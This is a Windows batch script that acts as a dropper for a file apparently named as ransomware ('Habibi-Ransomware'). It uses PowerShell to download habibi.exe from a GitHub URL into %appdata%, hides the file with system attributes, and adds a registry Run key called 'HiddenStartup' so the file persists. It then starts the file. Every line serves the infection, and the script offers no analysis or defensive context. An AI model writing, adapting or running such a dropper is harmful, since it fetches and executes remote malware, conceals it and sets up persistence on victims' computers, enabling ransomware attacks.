@echo off
:: Download the EXE file
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NEJANX/Habibi-Ransomware/refs/heads/main/habibi.exe' -OutFile '%appdata%\habibi.exe'"

:: Hide the file using attrib command
attrib +H +S "%appdata%\habibi.exe"

:: Add the file to startup (invisible)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HiddenStartup" /t REG_SZ /d "%appdata%\habibi.exe" /f

:: Start the program
start "" "%appdata%\habibi.exe"

:: Exit the batch file
exit